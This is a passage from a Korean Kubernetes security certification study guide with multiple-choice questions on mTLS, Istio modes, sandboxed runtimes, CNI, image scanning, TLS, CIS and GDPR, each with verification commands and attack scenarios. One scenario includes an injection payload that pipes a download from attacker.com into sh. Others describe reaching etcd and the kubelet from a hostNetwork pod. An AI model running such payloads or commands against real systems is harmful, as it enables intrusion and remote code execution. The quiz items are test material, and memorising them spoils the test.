2: eth0@if10: <BROADCAST> 10.244.0.15/24     ← Pod CIDR IP만 보임

# hostNetwork Pod에서 접근 가능한 로컬 서비스:
# 127.0.0.1:10250 — kubelet API
# 127.0.0.1:2379  — etcd (컨트롤 플레인 노드)
# 127.0.0.1:10257 — controller-manager
# 127.0.0.1:10259 — scheduler
```

**오답 분석:**
- A) 메모리 사용 증가 — hostNetwork는 네트워크 네임스페이스만 공유하며, 메모리 사용량과 관련이 없다.
- C) 로그가 호스트에 저장 — 로그 저장 위치는 컨테이너 런타임과 로깅 설정에 의해 결정되며, hostNetwork와 무관하다.
- D) CPU 사용량 증가 — 네트워크 네임스페이스 공유는 CPU 오버헤드를 줄이는 방향이다(NAT 미사용).

**보안 원리:**
Linux 네트워크 네임스페이스는 컨테이너의 네트워크 스택을 호스트로부터 격리하는 핵심 메커니즘이다. `hostNetwork: true`는 이 격리를 완전히 해제한다. 결과적으로: (1) Pod IP가 노드 IP와 동일해져 포트 충돌이 발생할 수 있다 (2) CNI 플러그인이 할당한 Pod CIDR을 사용하지 않아 NetworkPolicy가 적용되지 않는다 (3) 127.0.0.1에 바인딩된 노드 로컬 서비스(kubelet, etcd)에 접근 가능하다.

**공격 시나리오:**
hostNetwork Pod에서 공격자가 `curl http://127.0.0.1:2379/v3/kv/range`로 etcd에 직접 접근한다(etcd가 localhost만 리스닝하고 있어 외부에서는 접근 불가하지만, hostNetwork Pod에서는 가능). etcd에 인증이 없거나 TLS peer 검증이 약하면 모든 Secret을 추출할 수 있다. 또한 `127.0.0.1:10250`의 kubelet API에 접근하여 동일 노드의 다른 Pod에 exec 명령을 실행할 수 있다.

**등장 배경:**
hostNetwork는 Ingress Controller, CNI 플러그인, 모니터링 에이전트 등 호스트 네트워크에 직접 접근해야 하는 시스템 컴포넌트를 위해 설계되었다. 예를 들어 MetalLB는 ARP/BGP로 로드밸런서 IP를 광고하기 위해 hostNetwork가 필요하다. 그러나 일반 애플리케이션 Pod에는 사용해서는 안 되며, PSA baseline에서 금지된다.

</details>

---

## Platform Security (6문항)

### 문제 31.
서비스 메시에서 mTLS(Mutual TLS)의 역할은?

A) 서비스 간 통신을 로드 밸런싱한다
B) 서비스 간 통신을 암호화하고 양방향 인증을 수행한다
C) 서비스의 health check를 수행한다
D) 서비스의 자동 스케일링을 관리한다

<details><summary>정답 확인</summary>

**정답: B) 서비스 간 통신을 암호화하고 양방향 인증을 수행한다 ✅**

mTLS는 클라이언트와 서버 양쪽 모두 인증서를 제시하여 상호 인증을 수행하고 통신을 암호화한다. tart-infra의 dev 클러스터에서 Istio가 STRICT 모드로 mTLS를 적용하여 demo 네임스페이스의 모든 서비스 간 통신을 보호하고 있다.

**검증:**
```bash
# Istio mTLS 상태 확인
kubectl get peerauthentication -A
# 특정 서비스의 mTLS 연결 상태 확인
istioctl x describe pod <pod-name> -n demo
# Envoy 프록시에서 TLS 인증서 확인
istioctl proxy-config secret <pod-name> -n demo
# mTLS 통신 검증 (평문 요청 차단 확인)
kubectl exec -n demo non-mesh-pod -- curl -s http://nginx-svc.demo.svc:80
```
```text
# PeerAuthentication 목록:
NAMESPACE   NAME      MODE     AGE
demo        default   STRICT   30d

# istioctl describe 출력:
Pod: nginx-pod.demo
  mTLS: STRICT
  Cert Chain: VALID (expires in 23h)
  Root Cert: VALID (expires in 29d)
  Destination Rules: default/demo (mTLS enabled)

# STRICT 모드에서 비메시 Pod의 요청 결과:
curl: (56) Recv failure: Connection reset by peer
# → mTLS가 아닌 평문 연결이 거부됨
```

**오답 분석:**
- A) 로드 밸런싱 — 로드 밸런싱은 서비스 메시의 트래픽 관리 기능이며, mTLS와 별개이다. Envoy의 클러스터 로드 밸런서가 담당한다.
- C) health check — health check는 Pod의 liveness/readiness probe 또는 Envoy의 health check가 담당한다. mTLS의 역할이 아니다.
- D) 자동 스케일링 — HPA(Horizontal Pod Autoscaler)가 담당하는 기능이다. 서비스 메시와 무관하다.

**보안 원리:**
mTLS는 일반 TLS(서버만 인증서 제시)에 클라이언트 인증서를 추가한 것이다. 서비스 메시에서의 동작: (1) Istiod(CA)가 각 워크로드에 SPIFFE 형식의 X.509 인증서를 자동 발급한다(예: `spiffe://cluster.local/ns/demo/sa/nginx`). (2) sidecar Envoy 프록시가 아웃바운드 요청 시 클라이언트 인증서를 제시한다. (3) 대상 Envoy가 클라이언트 인증서를 검증하여 신원을 확인한다. 인증서는 자동 로테이션(기본 24시간)되어 키 관리 부담이 없다.

**공격 시나리오:**
mTLS 없이 평문 통신하는 마이크로서비스 환경에서, 공격자가 동일 네트워크 세그먼트에서 ARP spoofing을 수행하여 서비스 A → 서비스 B 통신을 가로챈다(Man-in-the-Middle). 전송 중인 JWT 토큰, API 키, 개인정보가 평문으로 노출된다. mTLS가 적용되었다면 (1) 통신이 암호화되어 스니핑 불가 (2) 공격자의 프록시가 유효한 인증서가 없어 연결 자체가 거부된다.

**등장 배경:**
전통적으로 서비스 간 통신 암호화는 각 애플리케이션이 TLS 라이브러리를 직접 구현해야 했다. 인증서 관리, 로테이션, 애플리케이션 코드 수정의 부담이 컸다. 서비스 메시(Istio, Linkerd)가 sidecar 프록시 패턴으로 mTLS를 애플리케이션 코드 변경 없이 투명하게 적용하면서, 대규모 마이크로서비스 환경에서의 전송 보안이 실현 가능해졌다.

</details>

### 문제 32.
Istio의 PeerAuthentication에서 STRICT 모드와 PERMISSIVE 모드의 차이는?

A) STRICT는 mTLS만 허용하고, PERMISSIVE는 mTLS와 평문 트래픽을 모두 허용한다
B) STRICT는 외부 트래픽을 차단하고, PERMISSIVE는 허용한다
C) STRICT는 인증서 갱신을 하지 않고, PERMISSIVE는 자동 갱신한다
D) 둘의 차이는 없다

<details><summary>정답 확인</summary>

**정답: A) STRICT는 mTLS만 허용하고, PERMISSIVE는 mTLS와 평문 트래픽을 모두 허용한다 ✅**

STRICT 모드에서는 mTLS 연결만 허용하여 암호화되지 않은 트래픽을 거부한다. PERMISSIVE 모드는 마이그레이션 기간에 사용하며, mTLS와 평문 트래픽을 모두 수용한다. tart-infra의 dev 클러스터에서 `kubectl get peerauthentication -n demo`로 STRICT 설정을 확인할 수 있다.

**검증:**
```bash
# PeerAuthentication 모드 확인
kubectl get peerauthentication -n demo -o yaml
# STRICT 모드에서 비메시 클라이언트 접근 테스트
kubectl run test --image=busybox --restart=Never -- wget -qO- http://nginx-svc.demo:80
# PERMISSIVE 모드로 전환
kubectl apply -f - <<EOF
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: demo
spec:
  mtls:
    mode: PERMISSIVE
EOF
# 전환 후 동일 테스트
kubectl run test2 --image=busybox --restart=Never -- wget -qO- http://nginx-svc.demo:80
```
```text
# STRICT 모드 — 비메시 Pod 요청 결과:
wget: error getting response: Connection reset by peer
# → 평문 연결 거부

# PERMISSIVE 모드 — 비메시 Pod 요청 결과:
<html><body><h1>Welcome to nginx!</h1></body></html>
# → 평문 연결 허용 (mTLS도 동시에 허용)

# PeerAuthentication 모드 옵션:
# UNSET      — 상위(메시 전체) 설정을 상속
# DISABLE    — mTLS 비활성화 (평문만)
# PERMISSIVE — mTLS + 평문 모두 허용
# STRICT     — mTLS만 허용
```

**오답 분석:**
- B) 외부 트래픽 차단/허용 — 외부 트래픽 제어는 Gateway, VirtualService, AuthorizationPolicy가 담당한다. PeerAuthentication은 서비스 간 mTLS 모드만 결정한다.
- C) 인증서 갱신 차이 — 두 모드 모두 Istiod가 인증서를 자동 로테이션한다. 인증서 갱신 동작에 차이가 없다.
- D) 차이 없음 — STRICT와 PERMISSIVE는 보안 수준이 명확히 다르다.

**보안 원리:**
PERMISSIVE 모드는 mTLS 마이그레이션을 위한 과도기 설정이다. Envoy 프록시가 인바운드 연결의 첫 번째 바이트를 검사하여 TLS ClientHello인지 평문인지 자동 감지(protocol sniffing)한다. TLS이면 mTLS 핸드셰이크를 진행하고, 평문이면 그대로 수용한다. STRICT 모드에서는 TLS ClientHello가 아닌 연결을 즉시 RST(리셋)한다.

**공격 시나리오:**
PERMISSIVE 모드가 마이그레이션 완료 후에도 유지되면, 공격자가 sidecar가 주입되지 않은 Pod(또는 직접 생성한 Pod)에서 대상 서비스에 평문으로 접근할 수 있다. mTLS 인증서 없이도 서비스에 도달하므로, 서비스 간 신원 검증이 우회된다. STRICT 모드로 전환하면 유효한 Istio 인증서가 없는 모든 연결이 거부되어 비인가 접근이 차단된다.

**등장 배경:**
기존 레거시 서비스를 서비스 메시로 마이그레이션할 때, 모든 서비스에 동시에 sidecar를 주입하기 어렵다. PERMISSIVE 모드는 메시 내부와 외부 서비스가 공존하는 과도기에 호환성을 유지하면서 점진적으로 mTLS를 적용할 수 있게 한다. 마이그레이션이 완료되면 반드시 STRICT로 전환해야 한다.

</details>

### 문제 33.
컨테이너 런타임의 보안 격리를 강화하는 기술이 아닌 것은?

A) gVisor (runsc)
B) Kata Containers
C) Docker Compose
D) seccomp profile

<details><summary>정답 확인</summary>

**정답: C) Docker Compose ✅**

Docker Compose는 다중 컨테이너 애플리케이션 정의 도구이며, 보안 격리 기술이 아니다. gVisor는 사용자 공간 커널로 시스템 콜을 중재하고, Kata Containers는 경량 VM으로 컨테이너를 실행하며, seccomp은 시스템 콜을 필터링하여 보안 격리를 강화한다.

**검증:**
```bash
# RuntimeClass로 gVisor/Kata 사용 확인
kubectl get runtimeclass
# seccomp 프로파일 확인
ls /var/lib/kubelet/seccomp/profiles/
# Pod의 seccomp 설정 확인
kubectl get pod <pod-name> -o jsonpath='{.spec.securityContext.seccompProfile}'
# gVisor(runsc) 런타임 사용 Pod 배포
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: gvisor-pod
spec:
  runtimeClassName: gvisor
  containers:
  - name: app
    image: nginx:1.25
EOF
```
```text
# RuntimeClass 목록:
NAME      HANDLER   AGE
gvisor    runsc     30d
kata      kata      30d

# 격리 수준 비교:
# runc (기본):     컨테이너 → Linux namespaces/cgroups → 호스트 커널
#                  보안: 커널 취약점 시 호스트 직접 노출
# gVisor (runsc):  컨테이너 → Sentry(사용자 공간 커널) → 호스트 커널
#                  보안: ~70%의 시스템 콜이 Sentry에서 처리, 커널 공격 표면 축소
# Kata:            컨테이너 → 경량 VM(QEMU/Firecracker) → 하이퍼바이저 → 호스트
#                  보안: 하드웨어 레벨 격리, 커널 독립

# seccomp 프로파일 (RuntimeDefault) 차단 시스템 콜 예시:
# 차단: mount, reboot, swapon, init_module, ptrace
# 허용: read, write, open, close, stat, mmap
```

**오답 분석:**
- A) gVisor (runsc) — 보안 격리 기술이다. Google이 개발한 사용자 공간 커널로, 컨테이너의 시스템 콜을 가로채어 호스트 커널 공격 표면을 줄인다.
- B) Kata Containers — 보안 격리 기술이다. 각 컨테이너를 경량 VM에서 실행하여 하드웨어 수준의 격리를 제공한다.
- D) seccomp profile — 보안 격리 기술이다. BPF 프로그램으로 허용된 시스템 콜만 통과시키는 커널 레벨 필터이다.

**보안 원리:**
컨테이너 격리의 핵심 문제는 "공유 커널"이다. 모든 컨테이너가 호스트 커널을 공유하므로, 커널 취약점(예: Dirty COW, CVE-2016-5195)이 발견되면 컨테이너에서 호스트로 탈출할 수 있다. 이를 완화하는 세 가지 접근법: (1) seccomp — 사용 가능한 시스템 콜을 제한하여 커널 공격 표면 축소 (2) gVisor — 대부분의 시스템 콜을 사용자 공간에서 처리하여 호스트 커널 접촉 최소화 (3) Kata — 커널 자체를 분리하여 VM 수준 격리 제공.

**공격 시나리오:**
runc 기반 기본 런타임에서 CVE-2024-21626(runc 컨테이너 탈출 취약점)을 악용하여 공격자가 `/proc/self/fd/` 심볼릭 링크를 조작, 호스트 파일시스템에 접근한다. gVisor를 사용했다면 해당 시스템 콜이 Sentry에서 처리되어 호스트 커널에 도달하지 않으므로 취약점이 트리거되지 않는다. Kata를 사용했다면 VM 경계에서 차단된다.

**등장 배경:**
2019년 runc CVE-2019-5736(컨테이너 탈출) 취약점이 발표되면서 공유 커널의 위험성이 실증되었다. 멀티테넌트 Kubernetes 환경에서 신뢰할 수 없는 워크로드를 안전하게 실행해야 하는 요구가 증가하였다. Google은 GKE Sandbox(gVisor)를, AWS는 Firecracker(Kata와 유사)를 도입하여 서비스형 컨테이너의 격리를 강화하였다.

</details>

### 문제 34.
CNI(Container Network Interface) 플러그인이 제공하는 보안 기능이 아닌 것은?

A) NetworkPolicy 구현
B) Pod 간 트래픽 암호화 (WireGuard 등)
C) RBAC 권한 관리
D) L3/L4 네트워크 접근 제어

<details><summary>정답 확인</summary>

**정답: C) RBAC 권한 관리 ✅**

RBAC는 API Server가 관리하는 Kubernetes 내장 기능이며, CNI 플러그인과 무관하다. tart-infra에서 사용하는 Cilium은 NetworkPolicy 구현, WireGuard 기반 트래픽 암호화, L3/L4/L7 접근 제어, CiliumNetworkPolicy를 통한 확장된 보안 기능을 제공한다.

**검증:**
```bash
# Cilium 상태 확인
cilium status
# NetworkPolicy 구현 확인
kubectl get networkpolicy -A
kubectl get ciliumnetworkpolicy -A
# WireGuard 암호화 상태 확인
cilium encrypt status
# Cilium이 관리하는 보안 기능 확인
cilium endpoint list -o jsonpath='{[*].status.policy}'
```
```text
# cilium status 출력 (보안 관련 항목):
Encryption:              Wireguard   [NodeEncryption: Enabled]
KubeProxyReplacement:    True
NetworkPolicy:           Enabled
L7 Proxy:                Enabled (Envoy)

# cilium encrypt status:
Encryption:  WireGuard
Interface:   cilium_wg0
Public key:  abc123...
Peers:       3 (all connected)

# CNI 보안 기능 범위:
# ✅ NetworkPolicy 구현 (L3/L4/L7)
# ✅ Pod 간 트래픽 암호화 (WireGuard/IPsec)
# ✅ 네트워크 접근 제어
# ❌ RBAC — API Server의 kube-apiserver가 담당
```

**오답 분석:**
- A) NetworkPolicy 구현 — CNI 플러그인의 핵심 보안 기능이다. CNI가 NetworkPolicy를 구현하지 않으면 정책을 생성해도 적용되지 않는다(예: Flannel은 NetworkPolicy 미지원).
- B) Pod 간 트래픽 암호화 — Cilium(WireGuard), Calico(WireGuard/IPsec)가 노드 간 Pod 트래픽을 암호화한다.
- D) L3/L4 접근 제어 — CNI 플러그인이 iptables, eBPF 등으로 IP/포트 기반 트래픽 필터링을 수행한다.

**보안 원리:**
CNI 플러그인은 데이터 플레인에서 네트워크 보안을 구현한다. Cilium의 경우 eBPF 프로그램을 커널에 로드하여 패킷 단위로 정책을 적용한다. iptables 기반 CNI(Calico, kube-proxy)와 달리 eBPF는 커널 네트워크 스택의 초기 단계(TC/XDP)에서 패킷을 처리하므로 성능 오버헤드가 적다. RBAC는 API 요청(HTTP)을 대상으로 하고, CNI는 네트워크 패킷(TCP/UDP/ICMP)을 대상으로 하므로 완전히 다른 레이어에서 동작한다.

**공격 시나리오:**
CNI가 트래픽 암호화를 제공하지 않는 환경에서, 공격자가 노드 간 네트워크를 스니핑한다. Pod A(노드1) → Pod B(노드2) 통신이 평문 VXLAN으로 캡슐화되어 전송되므로, 외부 패킷 캡처로 내부 Pod 통신 내용(API 호출, 데이터)이 노출된다. Cilium의 WireGuard 암호화가 활성화되면 노드 간 모든 트래픽이 WireGuard 터널을 통해 암호화되어 스니핑이 무력화된다.

**등장 배경:**
Kubernetes는 CNI 인터페이스만 정의하고 구현은 플러그인에 위임한다. 초기 CNI(Flannel)는 네트워크 연결만 제공하고 보안 기능이 없었다. NetworkPolicy API가 도입되면서 Calico가 iptables 기반 구현을 선도하였고, Cilium이 eBPF 기반으로 성능과 L7 기능을 향상시켰다. 트래픽 암호화(WireGuard/IPsec)는 클라우드 환경에서 노드 간 네트워크를 신뢰할 수 없는 경우를 위해 추가되었다.

</details>

### 문제 35.
이미지 스캐닝 도구(Trivy 등)가 탐지하는 대상이 아닌 것은?

A) OS 패키지의 알려진 취약점(CVE)
B) 애플리케이션 라이브러리의 취약점
C) 잘못된 설정(Misconfiguration)
D) 런타임 시 발생하는 이상 행위

<details><summary>정답 확인</summary>

**정답: D) 런타임 시 발생하는 이상 행위 ✅**

이미지 스캐너는 정적 분석 도구로, 이미지 내 OS 패키지, 라이브러리 취약점, IaC 설정 오류 등을 탐지한다. 런타임 이상 행위 탐지는 Falco, Sysdig 등의 런타임 보안 도구가 담당한다.

**검증:**
```bash
# Trivy로 이미지 취약점 스캔
trivy image nginx:1.25
# Trivy로 설정 오류 스캔
trivy config k8s-manifests/
# Trivy로 파일시스템 Secret 스캔
trivy fs --scanners secret .
# Grype로 SBOM 기반 스캔
grype sbom:sbom.json
```
```text
# Trivy 스캔 결과 예시 (OS 패키지 취약점):
nginx:1.25 (debian 12.4)
Total: 45 (UNKNOWN: 0, LOW: 25, MEDIUM: 15, HIGH: 4, CRITICAL: 1)

┌──────────────┬────────────────┬──────────┬────────────┬───────────────┐
│   Library    │ Vulnerability  │ Severity │  Installed │ Fixed Version │
├──────────────┼────────────────┼──────────┼────────────┼───────────────┤
│ libssl3      │ CVE-2024-0727  │ CRITICAL │ 3.0.11-1   │ 3.0.13-1      │
│ libc6        │ CVE-2023-6246  │ HIGH     │ 2.36-9     │ 2.36-9+deb12u4│
└──────────────┴────────────────┴──────────┴────────────┴───────────────┘

# Trivy config 스캔 결과 (설정 오류):
deployment.yaml (kubernetes)
Tests: 28 (SUCCESSES: 20, FAILURES: 8)
FAIL: Container 'app' should set 'securityContext.runAsNonRoot' to true
FAIL: Container 'app' should drop all capabilities
```

**오답 분석:**
- A) OS 패키지 CVE — Trivy의 핵심 기능이다. NVD, Alpine SecDB, Debian Security Tracker 등의 취약점 DB와 이미지의 패키지 목록을 대조한다.
- B) 라이브러리 취약점 — 언어별 패키지(npm, pip, gem, Maven)의 취약점도 탐지한다. `node_modules/`, `requirements.txt` 등을 파싱한다.
- C) 잘못된 설정 — Trivy의 `config` 스캐너가 Dockerfile, Kubernetes YAML, Terraform HCL의 보안 설정 오류를 탐지한다.

**보안 원리:**
이미지 스캐너는 정적 분석(Static Analysis)이다. 이미지의 레이어를 언팩하여 파일시스템을 추출하고, (1) OS 패키지 관리자 DB(`/var/lib/dpkg/status`, `/var/lib/rpm/Packages`)에서 설치된 패키지 목록을 파싱한다 (2) 언어별 매니페스트(`package-lock.json`, `go.sum`)에서 의존성을 파싱한다 (3) 이를 CVE 데이터베이스와 대조하여 알려진 취약점을 보고한다. 이미지가 실행 중일 때의 동적 행위(파일 생성, 네트워크 연결)는 분석하지 않는다.

**공격 시나리오:**
이미지 스캔에서 취약점 0건인 이미지가 배포되었지만, 애플리케이션 로직에 Command Injection 취약점이 존재한다. 공격자가 `; curl attacker.com/malware | sh`를 입력하여 런타임에 악성 바이너리를 다운로드하고 실행한다. 이미지 스캐너는 이를 탐지하지 못한다. Falco의 "Write below binary dir" 규칙이 바이너리 디렉터리 쓰기를 탐지하여 경고를 발생시킨다.

**등장 배경:**
컨테이너 이미지에 포함된 취약점이 프로덕션에 그대로 배포되는 문제가 빈발하였다. 2017년 Equifax 침해 사건에서 Apache Struts의 알려진 CVE가 패치되지 않은 채 운영되어 1.43억 명의 개인정보가 유출되었다. 이후 CI/CD 파이프라인에 이미지 스캔을 필수 단계로 포함하는 관행이 확산되었고, Trivy(Aqua Security, 2019)가 오픈소스로 빠르게 채택되었다.

</details>

### 문제 36.
Kubernetes Ingress/Gateway에서 TLS를 종료(terminate)할 때 반드시 확인해야 하는 보안 사항은?

A) Ingress Controller의 CPU 사용량
B) TLS 인증서의 유효 기간과 최소 TLS 버전 설정
C) Ingress Controller의 레플리카 수
D) Ingress 리소스의 네임스페이스

<details><summary>정답 확인</summary>

**정답: B) TLS 인증서의 유효 기간과 최소 TLS 버전 설정 ✅**

TLS 종료 시 인증서 만료, TLS 1.0/1.1 같은 취약한 프로토콜 버전 사용, 약한 암호화 스위트 사용 등을 점검해야 한다. cert-manager를 통한 자동 인증서 갱신과 최소 TLS 1.2(권장 TLS 1.3) 설정이 중요하다.

**검증:**
```bash
# Ingress TLS 설정 확인
kubectl get ingress -n demo -o yaml | grep -A5 tls
# 인증서 유효기간 확인
kubectl get secret tls-secret -n demo -o jsonpath='{.data.tls\.crt}' | \
  base64 -d | openssl x509 -noout -dates
# cert-manager Certificate 리소스 확인
kubectl get certificate -n demo
# TLS 버전 테스트
openssl s_client -connect demo.example.com:443 -tls1_1 2>&1 | grep -i protocol
openssl s_client -connect demo.example.com:443 -tls1_3 2>&1 | grep -i protocol
```
```text
# 인증서 유효기간:
notBefore=Jan  1 00:00:00 2025 GMT
notAfter=Apr  1 00:00:00 2025 GMT    ← 만료일 확인 필수

# cert-manager Certificate 상태:
NAME       READY   SECRET       AGE
demo-tls   True    tls-secret   30d

# TLS 1.1 연결 시도 결과 (최소 TLS 1.2 설정 시):
140000000000000:error:1409442E:SSL:ssl3_read_bytes:tlsv1 alert protocol version
# → TLS 1.1 연결 거부

# TLS 1.3 연결 결과:
Protocol  : TLSv1.3
Cipher    : TLS_AES_256_GCM_SHA384
# → TLS 1.3 연결 성공

# Nginx Ingress Controller TLS 최소 버전 설정:
# nginx.ingress.kubernetes.io/ssl-min-version: "TLSv1.2"
# nginx.ingress.kubernetes.io/ssl-ciphers: "ECDHE-RSA-AES256-GCM-SHA384:..."
```

**오답 분석:**
- A) Ingress Controller CPU 사용량 — 성능 관련 지표이다. TLS 핸드셰이크의 CPU 부하는 있지만, 보안 점검 항목이 아니다.
- C) 레플리카 수 — 가용성(HA) 관련 설정이다. 보안과 직접적 관련이 없다.
- D) Ingress 네임스페이스 — 네임스페이스 자체는 TLS 보안 설정이 아니다.

**보안 원리:**
TLS termination에서 점검해야 하는 세 가지 핵심 항목: (1) 인증서 유효성 — 만료된 인증서는 브라우저 경고를 유발하고, 사용자가 경고를 무시하는 습관을 형성하여 MITM 공격에 취약해진다. (2) 프로토콜 버전 — TLS 1.0/1.1은 BEAST, POODLE 등 알려진 취약점이 있어 2020년에 공식 폐기(RFC 8996)되었다. (3) 암호화 스위트 — RC4, 3DES, CBC 모드 등 약한 스위트는 사용하지 않아야 한다.

**공격 시나리오:**
TLS 1.0이 허용된 Ingress에서 공격자가 BEAST(Browser Exploit Against SSL/TLS) 공격을 수행한다. CBC 모드의 IV 예측 가능성을 이용하여 암호화된 쿠키(세션 토큰)를 한 바이트씩 복호화한다. 탈취한 세션 토큰으로 사용자를 사칭하여 애플리케이션에 접근한다. TLS 1.2 이상만 허용하고 AEAD 스위트(GCM, ChaCha20-Poly1305)를 사용하면 이 공격이 불가능하다.

**등장 배경:**
Let's Encrypt(2016년)가 무료 TLS 인증서를 제공하면서 HTTPS 보급률이 급증하였으나, 인증서 갱신을 수동으로 관리하면 만료 사고가 빈발하였다. cert-manager(Jetstack → CNCF)가 Kubernetes 환경에서 Let's Encrypt 인증서의 자동 발급/갱신을 구현하였다. 2021년 Let's Encrypt 루트 인증서(DST Root CA X3) 만료 사건에서 인증서 관리의 중요성이 재확인되었다.

</details>

---

## Compliance and Security Frameworks (4문항)

### 문제 37.
CIS Kubernetes Benchmark의 주요 목적은?

A) Kubernetes 클러스터의 성능을 최적화한다
B) Kubernetes 클러스터의 보안 설정을 점검하는 표준 가이드라인을 제공한다
C) Kubernetes 클러스터의 네트워크 대역폭을 측정한다
D) Kubernetes 클러스터의 스토리지 용량을 관리한다

<details><summary>정답 확인</summary>

**정답: B) Kubernetes 클러스터의 보안 설정을 점검하는 표준 가이드라인을 제공한다 ✅**

CIS(Center for Internet Security) Kubernetes Benchmark는 API Server, etcd, kubelet, 스케줄러 등의 보안 설정을 점검하는 표준 가이드라인이다. kube-bench 도구를 사용하여 자동으로 점검할 수 있다. tart-infra 클러스터에서 kube-bench를 실행하여 CIS 벤치마크 준수 여부를 확인할 수 있다.

**검증:**
```bash
# kube-bench 실행 (컨트롤 플레인 노드)
kube-bench run --targets master
# kube-bench 실행 (워커 노드)
kube-bench run --targets node
# 특정 섹션만 점검
kube-bench run --targets master --check 1.2.1,1.2.2
# JSON 형식으로 결과 출력
kube-bench run --json | jq '.Controls[].tests[].results[] | select(.status=="FAIL")'
```
```text
# kube-bench 출력 예시:
[INFO] 1 Control Plane Security Configuration
[INFO] 1.2 API Server
[PASS] 1.2.1 Ensure that the --anonymous-auth argument is set to false
[FAIL] 1.2.2 Ensure that the --token-auth-file parameter is not set
[PASS] 1.2.3 Ensure that the --kubelet-https argument is set to true
[WARN] 1.2.4 Ensure that the --kubelet-client-certificate and
              --kubelet-client-key arguments are set as appropriate

== Summary ==
45 checks PASS
5 checks FAIL
3 checks WARN
0 checks INFO

# FAIL 항목 상세:
1.2.2 Ensure that the --token-auth-file parameter is not set
  Remediation: Follow the documentation and configure alternate mechanisms
  for authentication. Then, edit the API server pod specification file
  /etc/kubernetes/manifests/kube-apiserver.yaml and remove the
  --token-auth-file=<filename> parameter.
```

**오답 분석:**
- A) 성능 최적화 — CIS Benchmark는 보안 설정에 초점을 맞춘다. 성능 최적화는 별도의 벤치마크(예: Kubernetes perf-tests)가 담당한다.
- C) 네트워크 대역폭 측정 — 네트워크 성능 측정은 iperf3 등의 도구가 담당한다.
- D) 스토리지 용량 관리 — 스토리지 관리는 CSI, PV/PVC 관련 설정이다.

**보안 원리:**
CIS Benchmark는 5개 섹션으로 구성된다: (1) Control Plane Components — API Server, Controller Manager, Scheduler, etcd의 보안 플래그 (2) etcd — TLS, 인증, 데이터 암호화 (3) Control Plane Configuration — 인증, RBAC, Admission Controller (4) Worker Nodes — kubelet, kube-proxy 보안 설정 (5) Policies — RBAC, NetworkPolicy, PSA, Secret 관리. 각 항목은 "Scored"(자동 점검 가능)와 "Not Scored"(수동 확인 필요)로 분류된다.

**공격 시나리오:**
CIS Benchmark를 무시하고 기본 설정으로 운영하는 클러스터: `--anonymous-auth=true`, `--authorization-mode=AlwaysAllow`, `--insecure-port=8080`이 설정되어 있다. 공격자가 8080 포트(인증/TLS 없음)로 API Server에 접근하여 모든 리소스를 자유롭게 조작한다. kube-bench를 정기적으로 실행하여 이러한 위험한 설정을 조기에 탐지해야 한다.

**등장 배경:**
조직마다 Kubernetes 보안 설정 수준이 달라 일관된 보안 기준이 필요하였다. CIS(비영리 보안 표준 기관)가 Kubernetes 1.6부터 Benchmark를 발행하고 있으며, 각 Kubernetes 버전에 맞게 업데이트된다. Aqua Security가 kube-bench를 오픈소스로 개발하여 Benchmark의 자동화된 점검을 가능하게 하였다.

</details>

### 문제 38.
Kubernetes 환경에서 GDPR(General Data Protection Regulation) 준수를 위해 고려해야 하는 사항이 아닌 것은?

A) Secret에 저장된 개인정보의 암호화
B) Audit 로그를 통한 개인정보 접근 기록
C) Pod의 CPU 리소스 요청량 설정
D) 데이터 보존 기간 정책 수립

<details><summary>정답 확인</summary>

**정답: C) Pod의 CPU 리소스 요청량 설정 ✅**

CPU 리소스 설정은 성능 및 안정성 관련 설정이며 GDPR 준수와 무관하다. GDPR은 개인정보 보호에 관한 규정으로, 데이터 암호화, 접근 감사, 데이터 보존 정책, 삭제 권리(Right to Erasure) 등이 핵심 요구사항이다.

**검증:**
```bash
# Audit 로그 정책 확인 (개인정보 접근 기록)
cat /etc/kubernetes/audit-policy.yaml
# Secret 암호화 설정 확인
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep encryption-provider
# Audit 로그에서 Secret 접근 기록 조회
cat /var/log/kubernetes/audit.log | jq 'select(.objectRef.resource=="secrets")'
# 데이터 보존 정책 확인 (로그 로테이션)
cat /etc/logrotate.d/kubernetes-audit
```
```text
# Audit 정책 예시 (GDPR 준수):
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: RequestResponse        # 요청/응답 본문까지 기록
  resources:
  - group: ""
    resources: ["secrets"]       # Secret 접근 전체 감사
  namespaces: ["production"]
- level: Metadata               # 메타데이터만 기록
  resources:
  - group: ""
    resources: ["pods", "services"]

# Audit 로그 항목 예시:
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "verb": "get",
  "user": {"username": "dev-user"},
  "objectRef": {
    "resource": "secrets",
    "name": "user-credentials",
    "namespace": "production"
  },
  "responseStatus": {"code": 200},
  "requestReceivedTimestamp": "2025-03-30T10:15:30Z"
}
```

**오답 분석:**
- A) Secret 암호화 — GDPR Article 32는 "적절한 기술적 조치"로 개인정보 암호화를 요구한다. etcd의 encryption at rest가 해당한다.
- B) Audit 로그 — GDPR Article 30은 처리 활동 기록을 의무화한다. 누가 언제 개인정보에 접근했는지 감사 추적이 필요하다.
- D) 데이터 보존 정책 — GDPR Article 5(1)(e)는 목적에 필요한 기간만 데이터를 보존하도록 규정한다.

**보안 원리:**
GDPR(EU 일반 데이터 보호 규정, 2018년 시행)의 Kubernetes 관련 핵심 조항: (1) Article 25 — 설계 및 기본값에 의한 데이터 보호(Privacy by Design). SecurityContext, NetworkPolicy가 해당한다. (2) Article 32 — 암호화, 접근 제어 등 적절한 기술적 조치. Secret 암호화, RBAC, mTLS가 해당한다. (3) Article 17 — 삭제 권리(Right to Erasure). 사용자 요청 시 관련 데이터를 삭제하는 프로세스가 필요하다. (4) Article 33 — 72시간 내 침해 통지. 모니터링/알림 시스템이 필요하다.

**공격 시나리오:**
Audit 로그가 비활성화된 Kubernetes 클러스터에서 내부자가 `kubectl get secret user-db-credentials -o yaml`로 고객 DB 자격증명을 조회하고, DB에 접근하여 개인정보를 유출한다. Audit 로그가 없으면 누가 언제 Secret에 접근했는지 추적이 불가능하여 GDPR Article 33의 침해 통지 의무를 이행할 수 없다.

**등장 배경:**
